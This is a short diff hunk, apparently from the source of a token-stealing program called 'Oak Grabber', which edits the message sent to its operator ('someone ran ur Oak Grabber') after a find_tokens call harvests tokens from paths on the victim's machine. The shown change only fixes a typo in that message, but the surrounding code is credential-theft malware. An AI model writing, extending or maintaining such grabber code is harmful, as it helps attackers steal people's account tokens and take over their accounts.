@@ -139,7 +139,7 @@ def main():
             continue
 
         tokens = find_tokens(path)
-        embedMsg = f"**someone ran ur Oak Grabber**'** \n\n"
+        embedMsg = f"**someone ran ur Oak Grabber**\n\n"
 
         if len(tokens) > 0:
             for token in tokens:
